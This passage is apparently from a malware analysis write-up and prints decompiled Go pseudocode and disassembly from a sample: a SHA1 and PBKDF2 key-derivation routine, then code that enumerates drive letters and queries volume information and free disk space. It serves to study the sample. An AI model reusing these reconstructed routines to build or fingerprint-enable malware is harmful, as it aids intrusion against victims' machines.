    puVar4[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x98badcfe</span>;
    puVar4[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10325476</span>;
    puVar4[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc3d2e1f0</span>;
    puVar4[<span style="color:#ae81ff">0x15</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    puVar4[<span style="color:#ae81ff">0x16</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    puVar4[<span style="color:#ae81ff">0x17</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    sym.runtime.stringtoslicebyte(<span style="color:#ae81ff">0</span>, in_stack_ffffffa4, in_stack_ffffffa8);
    sym.crypto_sha1___digest_.Write(puVar4, in_stack_ffffffb0, in_stack_ffffffb4, in_stack_ffffffb8);
    sym.runtime.newobject(sym.type._9_uint8);
    <span style="color:#f92672">*</span>in_stack_ffffffb0 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x6e617247</span>;
    <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)((int32_t)in_stack_ffffffb0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x646e6172</span>;
    <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)((int32_t)in_stack_ffffffb0 <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x73697245</span>;
    sym.crypto_sha1___digest_.Write(puVar4, in_stack_ffffffb0, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">9</span>);
    sym.crypto_sha1___digest_.Sum(puVar4, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
    iVar2 <span style="color:#f92672">=</span> in_stack_ffffffb4;
    uVar5 <span style="color:#f92672">=</span> in_stack_ffffffb8;
    iVar3 <span style="color:#f92672">=</span> in_stack_ffffffbc;
    sym.crypto_sha1___digest_.Sum(puVar4, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
    <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">7</span> <span style="color:#f92672">&lt;</span> uVar5) {
        iVar2 <span style="color:#f92672">=</span> iVar2 <span style="color:#f92672">+</span> (<span style="color:#f92672">-</span>(iVar3 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x1f</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">8U</span>);
        sym.golang.org_x_crypto_pbkdf2.Key(in_stack_ffffffb4, in_stack_ffffffb8,
                        in_stack_ffffffbc, iVar2, uVar5 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>,
                        iVar3 <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x7e4</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">0x68ae74</span>);
        iVar3 <span style="color:#f92672">=</span> iStack52 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>;
        sym.runtime.makeslice(sym.type.uint8, iVar3, iVar3);
        sym.encoding_hex.Encode(iVar2, iVar3, iVar3, uStack56,
                                iStack52, uStack48);
        sym.runtime.slicebytetostring(<span style="color:#ae81ff">0</span>, iVar2, iVar3, iVar3);
        <span style="color:#66d9ef">return</span>;
    }
    sym.runtime.panicslice();
    <span style="color:#66d9ef">do</span> {
        invalidInstructionException();
    } <span style="color:#66d9ef">while</span>( true );
}
</code></pre></div><p>Disk space is gathered from all disks attached. First the malware checks which
drive letters exist.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7f92</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#ae81ff">0x1a</span> <span style="color:#75715e">; 26
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f7f95</span>  <span style="color:#66d9ef">jge</span> <span style="color:#ae81ff">0x5f80c7</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7f9b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_3ch</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7f9f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4ch</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fa3</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">var_64h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fa7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7faa</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x41</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fad</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fb1</span>  <span style="color:#66d9ef">sar</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0x1f</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fb4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fb8</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.intstring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fbd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fc1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fc5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fcc</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fd0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fd4</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x673e20</span>] <span style="color:#75715e">; &#34;:\&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f7fda</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fde</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fe6</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.concatstring2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7feb</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7fef</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_50h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7ff3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7ff7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_474h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f7ffe</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8001</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8005</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.Stat</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f800a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f800e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8012</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8015</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8019</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.IsNotExist</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f801e</span>  <span style="color:#66d9ef">movzx</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">byte</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8023</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">al</span>, <span style="color:#66d9ef">al</span>
</code></pre></div><p>The disk space is gotten by calling <code>GetVolumeInformationW</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f82e9</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#ae81ff">0x67983a</span>] <span style="color:#75715e">; &#34;GetVolumeInformationW&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005f82ef</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f82f3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x15</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f82fb</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall.GetProcAddress</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8300</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8304</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pGetVolumeInformationW</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8308</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_470h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f830f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8312</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8316</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ebp</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f831a</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall.StringToUTF16Ptr</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f831f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8323</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_498h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f832a</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">var_266h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8331</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_494h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8338</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">var_54h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f833c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_490h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8343</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">var_58h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8347</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_48ch</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f834e</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">var_5ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8352</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_488h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8359</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ebx</span>, [<span style="color:#66d9ef">var_68h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f835d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_484h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8364</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pGetVolumeInformationW</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8368</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f836b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">8</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8373</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_498h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f837a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f837e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_494h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8385</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8389</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">0x105</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8391</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_490h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8398</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_14h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f839c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_48ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83a3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_18h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83a7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_488h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83ae</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1ch</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83b2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_484h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83b9</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_20h</span>], <span style="color:#66d9ef">ebx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83bd</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_24h</span>], <span style="color:#ae81ff">0x105</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83c5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_28h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f83cd</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall.Syscall9</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f80fa</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_470h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8101</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8104</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8108</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f810c</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall.StringToUTF16Ptr</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8111</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8115</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_49ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f811c</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">sym.type._4_uintptr</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8122</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8125</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.newobject</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f812a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f812e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_49ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8135</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8137</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4ach</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f813e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">4</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8141</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4a8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8148</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">8</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f814b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4b0h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8152</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xc</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8155</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pGetDiskFreeSpaceExW</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f815c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f815f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8163</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">4</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f816b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">4</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8173</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall___Proc_.Call</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8178</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_470h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f817f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8182</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_38h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f8186</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005f818a</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.syscall.StringToUTF16Ptr</span>
